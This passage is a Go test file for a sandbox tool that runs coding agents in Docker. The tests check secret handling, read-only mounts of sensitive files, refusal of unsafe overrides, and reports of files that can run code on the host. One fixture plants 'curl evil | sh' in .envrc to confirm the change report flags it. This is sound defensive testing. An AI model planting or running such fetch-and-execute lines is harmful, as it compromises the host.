package main

import (
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"slices"
	"strings"
	"testing"

	"kota/assets"
	"kota/internal/agent"
	"kota/internal/changereport"
	"kota/internal/deps"
	"kota/internal/docker"
	"kota/internal/instructions"
	"kota/internal/prepgate"
	"kota/internal/probe"
	"kota/internal/projectimage"
	"kota/internal/sandbox"
	"kota/internal/sessionregistry"
)

// Where the agents' config lives in the sandbox, and what they are told,
// as the tests expect it.
const (
	opencodeConfigPath       = "/etc/kota/opencode.json"
	opencodeInstructionsPath = sandbox.Home + "/.config/opencode/AGENTS.md"
	opencodeCLIEnv           = "OPENCODE_CLI_CONFIG_CONTENT"
	piAgentDir               = sandbox.Home + "/.pi/agent"
	piSessionDir             = sandbox.StateDir + "/pi/sessions"
	piNotePath               = piAgentDir + "/APPEND_SYSTEM.md"
	piKeybindingsPath        = piAgentDir + "/keybindings.json"
	providerID               = "kota"
)

// TestSessionMountsNoHostAgentConfig builds a session for each agent against
// a fake HOME that has host agent config and state, and checks none of it is
// mounted.
func TestSessionMountsNoHostAgentConfig(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	t.Setenv("XDG_CACHE_HOME", filepath.Join(home, ".cache"))
	t.Setenv("XDG_CONFIG_HOME", "")
	t.Setenv("KOTA_ALLOWED_ROOT", "")
	t.Setenv("GIT_CONFIG_NOSYSTEM", "1")
	t.Setenv("KOTA_GATEWAY_KEY", "")
	t.Setenv("KOTA_GATEWAY_KEY_FILE", "")
	hostDirs := []string{".config/opencode", ".local/share/opencode", ".local/state/opencode", ".opencode", ".pi"}
	for _, d := range append(hostDirs, "Projects/app") {
		if err := os.MkdirAll(filepath.Join(home, d), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	home, _ = filepath.EvalSymlinks(home)

	cases := []struct {
		agent   string
		configs []string
		env     map[string]string
		command []string
	}{
		{
			agent:   "opencode",
			configs: []string{opencodeConfigPath},
			env:     map[string]string{"OPENCODE_DISABLE_PROJECT_CONFIG": "1", opencodeCLIEnv: "{}"},
			command: []string{"opencode"},
		},
		{
			agent:   "pi",
			configs: []string{piAgentDir + "/settings.json", piAgentDir + "/models.json", piKeybindingsPath},
			env:     map[string]string{"PI_CODING_AGENT_DIR": piAgentDir, "PI_CODING_AGENT_SESSION_DIR": piSessionDir, "PI_OFFLINE": "1"},
			command: []string{"pi"},
		},
	}
	for _, c := range cases {
		t.Run(c.agent, func(t *testing.T) {
			sess, err := prepareTestSession(sessionArgs{
				agent:      c.agent,
				gatewayURL: defaultGateway,
				dir:        filepath.Join(home, "Projects/app"),
			}, sandbox.ModeRun)
			if err != nil {
				t.Fatal(err)
			}
			t.Cleanup(sess.cleanup)

			agent := sess.spec.Services[sandbox.AgentService]
			configs := map[string]bool{}
			var state bool
			for _, v := range agent.Volumes {
				for _, d := range hostDirs {
					if v.Source == filepath.Join(home, d) || strings.HasPrefix(v.Source, filepath.Join(home, d)+"/") {
						t.Errorf("host agent directory mounted: %+v", v)
					}
				}
				switch {
				case slices.Contains(c.configs, v.Target):
					configs[v.Target] = true
					if !v.ReadOnly || !strings.HasPrefix(v.Source, sess.sessionDir+"/") {
						t.Errorf("agent config mount = %+v, want read-only from the session dir", v)
					}
				case v.Target == sandbox.StateDir:
					state = true
					if v.Type != "volume" {
						t.Errorf("state mount = %+v, want a named volume", v)
					}
				}
			}
			if len(configs) != len(c.configs) || !state {
				t.Errorf("configs mounted = %v, state mounted = %v in %+v", configs, state, agent.Volumes)
			}
			want := sandbox.StateVolume(filepath.Join(home, "Projects/app"), c.agent)
			if got := sess.spec.Volumes["state"].Name; got != want {
				t.Errorf("state volume = %q, want %q", got, want)
			}
			for k, v := range c.env {
				if agent.Environment[k] != v {
					t.Errorf("env %s = %q, want %q", k, agent.Environment[k], v)
				}
			}
			if !slices.Equal(agent.Command, c.command) {
				t.Errorf("command = %q, want %q", agent.Command, c.command)
			}
		})
	}
}

// TestUsageFromAgentModule checks the usage text carries the agent
// module's help, wrapped, and no line is wider than 79 columns.
func TestUsageFromAgentModule(t *testing.T) {
	flat := strings.Join(strings.Fields(usage), " ")
	for _, help := range []string{agent.AgentHelp(), agent.AutoHelp(), agent.OverrideHelp()} {
		if !strings.Contains(flat, strings.Join(strings.Fields(help), " ")) {
			t.Errorf("usage lacks %q", help)
		}
	}
	for _, line := range strings.Split(usage, "\n") {
		// The gateway default is one unbreakable line.
		if len(line) > 79 && !strings.Contains(line, defaultGateway) {
			t.Errorf("line too long (%d): %q", len(line), line)
		}
	}
}

func TestWrap(t *testing.T) {
	got := wrap("  -f  ", 6, 20, "one two three four five six")
	want := "  -f  one two three\n      four five six\n"
	if got != want {
		t.Errorf("wrap = %q, want %q", got, want)
	}
}

// TestOverrideSource checks the "agent override:" line.
func TestOverrideSource(t *testing.T) {
	if got := overrideSource(nil); got != "none (bundled config)" {
		t.Errorf("none: %q", got)
	}
	if got := overrideSource([]string{"/a.json", "/b.json"}); got != "/a.json, /b.json" {
		t.Errorf("two: %q", got)
	}
}

// TestGatewayKeyReachesSessionByNameOnly checks a configured key is passed
// to the agent container by name and isn't written to the session dir.
func TestGatewayKeyReachesSessionByNameOnly(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	t.Setenv("XDG_CACHE_HOME", filepath.Join(home, ".cache"))
	t.Setenv("XDG_CONFIG_HOME", filepath.Join(home, ".config"))
	t.Setenv("KOTA_ALLOWED_ROOT", "")
	t.Setenv("GIT_CONFIG_NOSYSTEM", "1")
	const secret = "sk-unit-test-secret"
	t.Setenv("KOTA_GATEWAY_KEY", secret)
	t.Setenv("KOTA_GATEWAY_KEY_FILE", "")
	project := filepath.Join(home, "Projects/app")
	if err := os.MkdirAll(project, 0o755); err != nil {
		t.Fatal(err)
	}

	sess, err := prepareTestSession(sessionArgs{agent: agent.Default, gatewayURL: defaultGateway, dir: project}, sandbox.ModeRun)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(sess.cleanup)
	if sess.gatewayKey != secret {
		t.Errorf("session key not loaded")
	}
	agent := sess.spec.Services[sandbox.AgentService]
	if !slices.Contains(agent.PassEnv, sandbox.GatewayKeyEnv) {
		t.Errorf("pass env = %v, want %s", agent.PassEnv, sandbox.GatewayKeyEnv)
	}
	data, err := json.Marshal(sess.spec.Literal())
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(data), secret) {
		t.Error("key in the compose spec")
	}
	var out strings.Builder
	printMounts(&out, sess.spec)
	if strings.Contains(out.String(), secret) || !strings.Contains(out.String(), "gateway key: configured") {
		t.Errorf("check output = %q", out.String())
	}
}

// fakeHome points HOME at a temp dir with a project under ~/Projects, and
// returns the resolved project path.
func fakeHome(t *testing.T, files map[string]string) string {
	t.Helper()
	home := t.TempDir()
	t.Setenv("HOME", home)
	t.Setenv("XDG_CACHE_HOME", filepath.Join(home, ".cache"))
	t.Setenv("XDG_CONFIG_HOME", filepath.Join(home, ".config"))
	t.Setenv("KOTA_ALLOWED_ROOT", "")
	t.Setenv("GIT_CONFIG_NOSYSTEM", "1")
	project := filepath.Join(home, "Projects/app")
	for rel, content := range files {
		p := filepath.Join(project, rel)
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	if out, err := exec.Command("git", "init", "-q", project).CombinedOutput(); err != nil {
		t.Fatalf("git init: %v\n%s", err, out)
	}
	project, _ = filepath.EvalSymlinks(project)
	return project
}

func prepareTestSession(sa sessionArgs, mode sandbox.Mode) (*session, error) {
	paths, err := resolveSessionPaths(sa)
	if err != nil {
		return nil, err
	}
	depPlan, err := detectDeps(paths.Project)
	if err != nil {
		return nil, err
	}
	return prepareSession(sa, mode, paths, paths.Project, depPlan)
}

// TestPrepSession checks prep gets the same protections as run, the
// dependency volumes, the install script, and no key or agent state.
func TestPrepSession(t *testing.T) {
	project := fakeHome(t, map[string]string{
		"package.json":   "{}",
		"pnpm-lock.yaml": "",
		".env":           "SECRET=1\n",
	})
	t.Setenv("KOTA_GATEWAY_KEY", "sk-unit-test-secret")
	t.Setenv("KOTA_GATEWAY_KEY_FILE", "")

	sess, err := prepareTestSession(sessionArgs{dir: project}, sandbox.ModePrep)
	if err != nil {
		t.Fatal(err)
	}
	if sess.gatewayKey != "" {
		t.Error("prep loaded the gateway key")
	}
	spec := sess.spec
	agent := spec.Services[sandbox.AgentService]
	if len(agent.PassEnv) > 0 {
		t.Errorf("pass env = %v", agent.PassEnv)
	}
	if _, ok := spec.Services[sandbox.ForwarderService]; ok {
		t.Error("prep has a forwarder")
	}
	readOnly := map[string]bool{}
	var depVolume string
	for _, v := range agent.Volumes {
		if v.ReadOnly {
			readOnly[v.Target] = true
		}
		if v.Target == sandbox.Workspace+"/node_modules" {
			depVolume = spec.Volumes[v.Source].Name
		}
		if v.Target == sandbox.StateDir {
			t.Errorf("prep mounts agent state: %+v", v)
		}
	}
	for _, target := range []string{"/workspace/.env", "/workspace/.git/hooks", "/workspace/.git/config", "/workspace/.envrc", "/workspace/kota.yaml"} {
		if !readOnly[target] {
			t.Errorf("%s is not read-only in prep", target)
		}
	}
	if depVolume != sandbox.DepVolume(project, "node_modules") {
		t.Errorf("node_modules volume = %q", depVolume)
	}
	if len(agent.Command) != 3 || !strings.Contains(agent.Command[2], "pnpm install --offline --frozen-lockfile --store-dir "+sandbox.PnpmStore) {
		t.Errorf("command = %q", agent.Command)
	}

	// The fetch phase runs only the fetch commands, with the same
	// protections and no key.
	fetch := sess.fetchSpec.Services[sandbox.AgentService]
	if len(fetch.Command) != 3 || !strings.Contains(fetch.Command[2], "pnpm fetch --ignore-pnpmfile") || strings.Contains(fetch.Command[2], "pnpm install") {
		t.Errorf("fetch command = %q", fetch.Command)
	}
	if len(fetch.PassEnv) > 0 {
		t.Errorf("fetch pass env = %v", fetch.PassEnv)
	}
	fetchRO := map[string]bool{}
	for _, v := range fetch.Volumes {
		fetchRO[v.Target] = v.ReadOnly
	}
	for _, target := range []string{"/workspace/.env", "/workspace/.git/hooks", "/workspace/.git/config", "/workspace/kota.yaml"} {
		if !fetchRO[target] {
			t.Errorf("%s is not read-only in fetch", target)
		}
	}
	if ro, ok := fetchRO[sandbox.Workspace+"/node_modules"]; !ok || ro {
		t.Error("fetch lacks the writable dependency volume, so pnpm fetch would write to the host")
	}

	// Docker creates the mount point; cleanup removes it while empty.
	nm := filepath.Join(project, "node_modules")
	if err := os.Mkdir(nm, 0o755); err != nil {
		t.Fatal(err)
	}
	sess.cleanup()
	if _, err := os.Lstat(nm); !os.IsNotExist(err) {
		t.Errorf("node_modules mount point left behind: %v", err)
	}
}

// TestHostDependencyDirKept checks cleanup never removes a dependency
// directory the host already had.
func TestHostDependencyDirKept(t *testing.T) {
	project := fakeHome(t, map[string]string{"package.json": "{}"})
	nm := filepath.Join(project, "node_modules")
	if err := os.Mkdir(nm, 0o755); err != nil {
		t.Fatal(err)
	}
	sess, err := prepareTestSession(sessionArgs{dir: project}, sandbox.ModePrep)
	if err != nil {
		t.Fatal(err)
	}
	sess.cleanup()
	if _, err := os.Stat(nm); err != nil {
		t.Errorf("host node_modules removed: %v", err)
	}
}

// TestBrokenManifestSession checks run, shell and check still start on a
// broken manifest, with volumes over the last prep's directories and over
// every host node_modules, while prep refuses.
func TestBrokenManifestSession(t *testing.T) {
	project := fakeHome(t, map[string]string{
		"package.json":                   "{broken",
		"packages/a/package.json":        "{}",
		"packages/a/node_modules/x/i.js": "host",
	})
	t.Setenv("KOTA_GATEWAY_KEY", "sk-unit-test-secret")
	t.Setenv("KOTA_GATEWAY_KEY_FILE", "")
	record := prepgate.Record{Dirs: []deps.Dir{
		{Path: "node_modules", Manifest: "package.json"},
		{Path: "packages/b/node_modules", Manifest: "packages/b/package.json"},
	}}
	if err := record.Save(testPrepRecord(t, project)); err != nil {
		t.Fatal(err)
	}

	depPlan, err := sessionDeps(project, project)
	if err != nil {
		t.Fatal(err)
	}
	sa := sessionArgs{agent: agent.Default, gatewayURL: defaultGateway, dir: project}
	paths, err := resolveSessionPaths(sa)
	if err != nil {
		t.Fatal(err)
	}
	sess, err := prepareSession(sa, sandbox.ModeRun, paths, paths.Project, depPlan)
	if err != nil {
		t.Fatal(err)
	}
	defer sess.cleanup()
	volumes := map[string]string{}
	for _, v := range sess.spec.Services[sandbox.AgentService].Volumes {
		volumes[v.Target] = sess.spec.Volumes[v.Source].Name
	}
	for _, dir := range []string{"node_modules", "packages/a/node_modules", "packages/b/node_modules"} {
		if got := volumes[sandbox.Workspace+"/"+dir]; got != sandbox.DepVolume(project, dir) {
			t.Errorf("%s volume = %q, want %q", dir, got, sandbox.DepVolume(project, dir))
		}
	}
	var out strings.Builder
	sess.printWarnings(&out)
	if !strings.Contains(out.String(), "WARNING: can't work out the dependencies (parse package.json") {
		t.Errorf("warnings = %q", out.String())
	}

	if err := cmdPrep([]string{project}); err == nil || !strings.Contains(err.Error(), "parse package.json") {
		t.Errorf("prep error = %v, want the parse error", err)
	}
}

func TestPrepRefusesVolumeOverProtectedPath(t *testing.T) {
	project := fakeHome(t, map[string]string{deps.ConfigFile: "prep:\n  dirs: [.husky]\n", ".husky/_/h": ""})
	if out, err := exec.Command("git", "-C", project, "config", "core.hooksPath", ".husky/_").CombinedOutput(); err != nil {
		t.Fatalf("%v\n%s", err, out)
	}
	if _, err := prepareTestSession(sessionArgs{dir: project}, sandbox.ModePrep); err == nil || !strings.Contains(err.Error(), ".husky") {
		t.Errorf("err = %v, want refusal of the volume over .husky", err)
	}
}

func TestPrepGateOutput(t *testing.T) {
	plan := deps.Plan{
		Steps: []deps.Step{{Name: "pnpm", Fetch: "pnpm fetch", Script: "pnpm install"}},
		Hooks: []string{"package.json: postinstall: node setup.js"},
	}
	var first strings.Builder
	printPrepGate(&first, "/p", plan, nil, prepgate.Decision{First: true})
	for _, want := range []string{"First prep of /p", "pnpm: pnpm fetch", "pnpm: pnpm install", "postinstall: node setup.js"} {
		if !strings.Contains(first.String(), want) {
			t.Errorf("first prep output lacks %q:\n%s", want, first.String())
		}
	}

	var others []changereport.Change
	for i := range 25 {
		others = append(others, changereport.Change{Path: fmt.Sprintf("src/f%02d.js", i), Kind: changereport.Modified})
	}
	var changed strings.Builder
	printPrepGate(&changed, "/p", plan, nil, prepgate.Decision{
		Inputs: []changereport.Change{{Path: "package.json", Kind: changereport.Modified}},
		Others: others,
	})
	for _, want := range []string{"modified  package.json", "25 other file(s)", "src/f19.js", "... and 5 more", "git -C /p diff"} {
		if !strings.Contains(changed.String(), want) {
			t.Errorf("changed output lacks %q:\n%s", want, changed.String())
		}
	}
	if strings.Contains(changed.String(), "src/f20.js") {
		t.Errorf("output not truncated:\n%s", changed.String())
	}
}

// notePaths are where each agent reads kota's note.
var notePaths = map[string]string{"opencode": opencodeInstructionsPath, "pi": piNotePath}

// noteOf returns the content of the agent's note in sess.
func noteOf(t *testing.T, sess *session) string {
	t.Helper()
	notePath := notePaths[sess.agent.Name()]
	for _, v := range sess.spec.Services[sandbox.AgentService].Volumes {
		if v.Target == notePath {
			if !v.ReadOnly {
				t.Errorf("note mounted writable: %+v", v)
			}
			data, err := os.ReadFile(v.Source)
			if err != nil {
				t.Fatal(err)
			}
			return string(data)
		}
	}
	t.Fatalf("no note mounted at %s", notePath)
	return ""
}

// TestInstructionsOverride checks the user's override replaces the working
// style in each agent's note and keeps the Sandbox facts, and that
// 'kota instructions' prints it and names its source.
func TestInstructionsOverride(t *testing.T) {
	t.Setenv("KOTA_GATEWAY_KEY", "")
	t.Setenv("KOTA_GATEWAY_KEY_FILE", "")
	project := fakeHome(t, map[string]string{"README.md": "x"})
	home := os.Getenv("HOME")

	var out, info strings.Builder
	if err := cmdInstructions(nil, &out, &info); err != nil {
		t.Fatal(err)
	}
	builtin, _ := assets.Agents.ReadFile(instructions.Default)
	if out.String() != string(builtin) || info.String() != "instructions: built-in default\n" {
		t.Errorf("default: stdout %q, stderr %q", out.String(), info.String())
	}

	// XDG_CONFIG_HOME is honored.
	xdg := filepath.Join(home, "xdg")
	t.Setenv("XDG_CONFIG_HOME", xdg)
	override := filepath.Join(xdg, "kota", "instructions.md")
	if err := os.MkdirAll(filepath.Dir(override), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(override, []byte("# My style\n\nAlways write haiku.\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	out.Reset()
	info.Reset()
	if err := cmdInstructions(nil, &out, &info); err != nil {
		t.Fatal(err)
	}
	if out.String() != "# My style\n\nAlways write haiku.\n" || info.String() != "instructions: override: "+override+"\n" {
		t.Errorf("override: stdout %q, stderr %q", out.String(), info.String())
	}

	for _, agent := range []string{"opencode", "pi"} {
		sa, err := parseOfflineArgs("run", []string{"--agent", agent, project}, nil)
		if err != nil {
			t.Fatal(err)
		}
		sess, err := prepareTestSession(sa, sandbox.ModeRun)
		if err != nil {
			t.Fatal(err)
		}
		note := noteOf(t, sess)
		sess.cleanup()
		if !strings.HasPrefix(note, "# My style\n\nAlways write haiku.\n\n# This sandbox\n") || strings.Contains(note, "# Working on tasks") {
			t.Errorf("%s: note doesn't start with the override, then the Sandbox facts:\n%s", agent, note)
		}
	}
}

// TestTicketDoneOnlyForPi checks pi gets the ticket_done extension, in a
// read-only extensions directory the probes check, and is told to call it,
// also under an override; opencode gets neither.
func TestTicketDoneOnlyForPi(t *testing.T) {
	t.Setenv("KOTA_GATEWAY_KEY", "")
	t.Setenv("KOTA_GATEWAY_KEY_FILE", "")
	project := fakeHome(t, map[string]string{"README.md": "x"})
	override := filepath.Join(os.Getenv("HOME"), ".config", "kota", "instructions.md")
	for _, withOverride := range []bool{false, true} {
		if withOverride {
			if err := os.MkdirAll(filepath.Dir(override), 0o755); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(override, []byte("# Mine\n"), 0o644); err != nil {
				t.Fatal(err)
			}
		}
		for _, agent := range []string{"opencode", "pi"} {
			sa, err := parseOfflineArgs("run", []string{"--agent", agent, project}, nil)
			if err != nil {
				t.Fatal(err)
			}
			sess, err := prepareTestSession(sa, sandbox.ModeRun)
			if err != nil {
				t.Fatal(err)
			}
			note := noteOf(t, sess)
			var ext *sandbox.Volume
			for _, v := range sess.spec.Services[sandbox.AgentService].Volumes {
				if strings.HasSuffix(v.Target, "/extensions") {
					ext = &v
				}
			}
			told := strings.Contains(note, "ticket_done")
			if agent == "opencode" {
				if told || ext != nil {
					t.Errorf("opencode (override %v): told %v, extensions %+v", withOverride, told, ext)
				}
				sess.cleanup()
				continue
			}
			if !told {
				t.Errorf("pi (override %v) isn't told to call ticket_done:\n%s", withOverride, note)
			}
			if ext == nil || ext.Target != piAgentDir+"/extensions" || !ext.ReadOnly {
				t.Fatalf("pi extensions mount = %+v, want read-only at %s/extensions", ext, piAgentDir)
			}
			want, _ := assets.Agents.ReadFile("agents/pi/extensions/ticket-done.ts")
			got, err := os.ReadFile(filepath.Join(ext.Source, "ticket-done.ts"))
			if err != nil || string(got) != string(want) {
				t.Errorf("extension source: %v, equal %v", err, string(got) == string(want))
			}
			sess.cleanup()
		}
	}
}

// TestInstructionsOverrideRefused checks a bad override stops startup with
// its path, before anything is created.
func TestInstructionsOverrideRefused(t *testing.T) {
	t.Setenv("KOTA_GATEWAY_KEY", "")
	t.Setenv("KOTA_GATEWAY_KEY_FILE", "")
	project := fakeHome(t, map[string]string{"README.md": "x"})
	override := filepath.Join(os.Getenv("HOME"), ".config", "kota", "instructions.md")
	if err := os.MkdirAll(override, 0o755); err != nil {
		t.Fatal(err)
	}
	sa, err := parseOfflineArgs("shell", []string{project}, nil)
	if err != nil {
		t.Fatal(err)
	}
	sa.shell = true
	if _, err := prepareTestSession(sa, sandbox.ModeRun); err == nil || !strings.Contains(err.Error(), override) {
		t.Errorf("err = %v, want it to name %s", err, override)
	}
	if err := cmdInstructions(nil, io.Discard, io.Discard); err == nil || !strings.Contains(err.Error(), override) {
		t.Errorf("kota instructions: err = %v, want it to name %s", err, override)
	}
	cache, _ := os.UserCacheDir()
	if entries, _ := os.ReadDir(filepath.Join(cache, "kota", "sessions")); len(entries) > 0 {
		t.Errorf("session dir left: %v", entries)
	}
}

// writeOverride writes an Agent override named name under the fake HOME's
// ~/.config/kota, and returns its path.
func writeOverride(t *testing.T, name, content string) string {
	t.Helper()
	file := filepath.Join(os.Getenv("HOME"), ".config", "kota", filepath.FromSlash(name))
	if err := os.MkdirAll(filepath.Dir(file), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(file, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	return file
}

// TestAgentOverrideRefused checks an override with a key that isn't
// allowed stops startup with its path and the key, before anything is
// created; prep, which runs no agent, isn't affected.
func TestAgentOverrideRefused(t *testing.T) {
	t.Setenv("KOTA_GATEWAY_KEY", "")
	t.Setenv("KOTA_GATEWAY_KEY_FILE", "")
	project := fakeHome(t, map[string]string{"README.md": "x"})
	file := writeOverride(t, "opencode/cli.json", `{"plugins": [{"package": "./evil.ts"}]}`)
	for _, cmd := range []string{"run", "shell"} {
		sa, err := parseOfflineArgs(cmd, []string{project}, nil)
		if err != nil {
			t.Fatal(err)
		}
		sa.shell = cmd == "shell"
		_, err = prepareTestSession(sa, sandbox.ModeRun)
		if err == nil || !strings.Contains(err.Error(), file) || !strings.Contains(err.Error(), `"plugins"`) {
			t.Errorf("%s: err = %v, want it to name %s and the key", cmd, err, file)
		}
	}
	cache, _ := os.UserCacheDir()
	if entries, _ := os.ReadDir(filepath.Join(cache, "kota", "sessions")); len(entries) > 0 {
		t.Errorf("session dir left: %v", entries)
	}
	sess, err := prepareTestSession(sessionArgs{dir: project}, sandbox.ModePrep)
	if err != nil {
		t.Fatalf("prep: %v", err)
	}
	if sess.agent != nil {
		t.Errorf("prep has agent %s", sess.agent.Name())
	}
	sess.cleanup()
}

// TestReportChangesDetails replays the issue 17 trial run: the session adds
// a devDependency and a postinstall script to package.json and edits
// .envrc, and the report names them or the command to see them.
func TestReportChangesDetails(t *testing.T) {
	project := t.TempDir()
	write := func(rel, content string) {
		t.Helper()
		if err := os.WriteFile(filepath.Join(project, rel), []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	write("package.json", `{"name":"app","devDependencies":{"vitest":"^1.0.0"}}`)
	write(".envrc", "use flake\n")
	before, err := changereport.SnapshotWith(project, nil)
	if err != nil {
		t.Fatal(err)
	}
	write("package.json", `{"name":"renamed","devDependencies":{"vitest":"^1.0.0","wrangler":"^4.0.0"},"scripts":{"postinstall":"node x.js"}}`)
	write(".envrc", "use flake\ncurl evil | sh\n")

	var out strings.Builder
	changes := reportChanges(&out, project, nil, before)
	if len(changes) != 2 {
		t.Errorf("changes = %v, want 2", changes)
	}
	want := fmt.Sprintf(`WARNING: the session changed 2 file(s) that can run code on the host. Review them before building, installing or opening the project in an editor:
  modified  .envrc
      see: git -C %[1]s diff HEAD -- .envrc
  modified  package.json
      devDependencies: added wrangler ^4.0.0
      scripts: added postinstall (runs on install) "node x.js"
`, project)
	if out.String() != want {
		t.Errorf("report\n got:\n%s\nwant:\n%s", out.String(), want)
	}
}

// TestPrepGateLocalDependency checks a local dependency's postinstall makes
// prep show other changed files, which that script may run.
func TestPrepGateLocalDependency(t *testing.T) {
	project := fakeHome(t, map[string]string{
		"package.json":            `{"devDependencies":{"tool":"file:tools/tool"}}`,
		"tools/tool/package.json": `{"scripts":{"postinstall":"node build.js"}}`,
		"tools/tool/build.js":     "// build\n",
	})
	plan, err := detectDeps(project)
	if err != nil {
		t.Fatal(err)
	}
	record, err := prepgate.Snapshot(project)
	if err != nil {
		t.Fatal(err)
	}
	if err := record.Save(testPrepRecord(t, project)); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(project, "tools/tool/build.js"), []byte("// changed\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	d, err := prepDecision(project, plan)
	if err != nil {
		t.Fatal(err)
	}
	if !d.Ask() {
		t.Fatal("prep would run without asking")
	}
	var out strings.Builder
	printPrepGate(&out, project, plan, nil, d)
	for _, want := range []string{"tools/tool/package.json: postinstall: node build.js", "tools/tool/build.js"} {
		if !strings.Contains(out.String(), want) {
			t.Errorf("prompt lacks %q:\n%s", want, out.String())
		}
	}
}

func TestReadYes(t *testing.T) {
	for in, want := range map[string]bool{"y\n": true, "Yes\n": true, " y ": true, "n\n": false, "": false, "yy\n": false} {
		if got := readYes(strings.NewReader(in)); got != want {
			t.Errorf("readYes(%q) = %v", in, got)
		}
	}
}

func TestUnknownAgentRefused(t *testing.T) {
	_, err := prepareTestSession(sessionArgs{agent: "claude", gatewayURL: defaultGateway, dir: fakeHome(t, map[string]string{})}, sandbox.ModeRun)
	if err == nil || !strings.Contains(err.Error(), "opencode, pi") {
		t.Errorf("err = %v, want unknown agent listing opencode, pi", err)
	}
}

func TestParseSessionArgs(t *testing.T) {
	cases := []struct {
		args    []string
		dir     string
		model   string
		agent   string
		ro      []string
		command []string
		wantErr bool
	}{
		{args: nil, dir: "."},
		{args: []string{"app"}, dir: "app"},
		{args: []string{"--model", "m", "app"}, dir: "app", model: "m"},
		{args: []string{"app", "--model", "m"}, dir: "app", model: "m"},
		{args: []string{"--ro", "a", "app", "--ro", "b"}, dir: "app", ro: []string{"a", "b"}},
		{args: []string{"app", "--", "sh", "-c", "x"}, dir: "app", command: []string{"sh", "-c", "x"}},
		{args: []string{"--", "opencode", "run", "hi"}, dir: ".", command: []string{"opencode", "run", "hi"}},
		{args: []string{"--model", "m", "--", "app"}, dir: ".", model: "m", command: []string{"app"}},
		{args: []string{"app", "--agent", "pi"}, dir: "app", agent: "pi"},
		{args: []string{"a", "b"}, wantErr: true},
		{args: []string{"--nope"}, wantErr: true},
	}
	for _, c := range cases {
		sa, err := parseSessionArgs("run", c.args, nil)
		if c.wantErr {
			if err == nil {
				t.Errorf("%q: no error", c.args)
			}
			continue
		}
		if err != nil {
			t.Errorf("%q: %v", c.args, err)
			continue
		}
		if c.agent == "" {
			c.agent = agent.Default
		}
		if sa.agent != c.agent || sa.dir != c.dir || sa.model != c.model || !slices.Equal(sa.ro, c.ro) || !slices.Equal(sa.command, c.command) {
			t.Errorf("%q: got agent=%q dir=%q model=%q ro=%q command=%q", c.args, sa.agent, sa.dir, sa.model, sa.ro, sa.command)
		}
	}
}

// TestSessionImage checks which image prepareSession gives the agent and
// the volumes service, with Docker's images faked.
func TestSessionImage(t *testing.T) {
	const dockerfile = "FROM kota-base:latest\nRUN apt-get install -y tree\n"
	t.Setenv("KOTA_GATEWAY_KEY", "")
	t.Setenv("KOTA_GATEWAY_KEY_FILE", "")
	cases := []struct {
		name    string
		files   map[string]string
		built   bool
		labels  string // Dockerfile the fake image was built from
		image   string // "project" or the base image
		warning string
	}{
		{name: "no Dockerfile", files: map[string]string{"package.json": "{}"}, image: baseImage},
		{name: "built", files: map[string]string{projectimage.File: dockerfile, "package.json": "{}"}, built: true, labels: dockerfile, image: "project"},
		{name: "not built", files: map[string]string{projectimage.File: dockerfile, "package.json": "{}"}, image: baseImage, warning: "has no image yet"},
		{name: "stale", files: map[string]string{projectimage.File: dockerfile, "package.json": "{}"}, built: true, labels: "FROM kota-base:latest\n", image: "project", warning: "changed since"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			project := fakeHome(t, c.files)
			calls := 0
			inspectImage = func(tag string) (string, map[string]string, bool, error) {
				calls++
				switch {
				case tag == baseImage:
					return "sha256:base", nil, true, nil
				case tag == projectimage.Tag(project) && c.built:
					return "sha256:project", projectimage.Labels([]byte(c.labels), "sha256:base"), true, nil
				}
				return "", nil, false, nil
			}
			t.Cleanup(func() { inspectImage = docker.InspectImage })

			want := c.image
			if want == "project" {
				want = projectimage.Tag(project)
			}
			for _, mode := range []sandbox.Mode{sandbox.ModeRun, sandbox.ModePrep} {
				sess, err := prepareTestSession(sessionArgs{agent: "opencode", gatewayURL: defaultGateway, dir: project}, mode)
				if err != nil {
					t.Fatal(err)
				}
				t.Cleanup(sess.cleanup)
				specs := []sandbox.Compose{sess.spec}
				if mode == sandbox.ModePrep {
					specs = append(specs, sess.fetchSpec)
				}
				for _, spec := range specs {
					if got := spec.Services[sandbox.AgentService].Image; got != want {
						t.Errorf("mode %d: agent image = %s, want %s", mode, got, want)
					}
					if got := spec.Services[sandbox.VolumesService].Image; got != baseImage {
						t.Errorf("mode %d: volumes service image = %s, want the base image", mode, got)
					}
				}
				var out strings.Builder
				sess.printWarnings(&out)
				if c.warning == "" && strings.Contains(out.String(), "WARNING") {
					t.Errorf("mode %d: unexpected warning: %s", mode, out.String())
				}
				if c.warning != "" && (!strings.Contains(out.String(), c.warning) || !strings.Contains(out.String(), "kota build "+project)) {
					t.Errorf("mode %d: output = %q, want %q and the build command", mode, out.String(), c.warning)
				}
			}
			if c.files[projectimage.File] == "" && calls > 0 {
				t.Error("inspected images for a project without a Dockerfile")
			}
		})
	}
}

// TestDockerfileReadOnly checks the project Dockerfile is protected like
// kota.yaml, since a build runs it with network access.
func TestDockerfileReadOnly(t *testing.T) {
	project := fakeHome(t, map[string]string{})
	t.Setenv("KOTA_GATEWAY_KEY", "")
	t.Setenv("KOTA_GATEWAY_KEY_FILE", "")
	sess, err := prepareTestSession(sessionArgs{agent: "opencode", gatewayURL: defaultGateway, dir: project}, sandbox.ModeRun)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(sess.cleanup)
	volumes := sess.spec.Services[sandbox.AgentService].Volumes
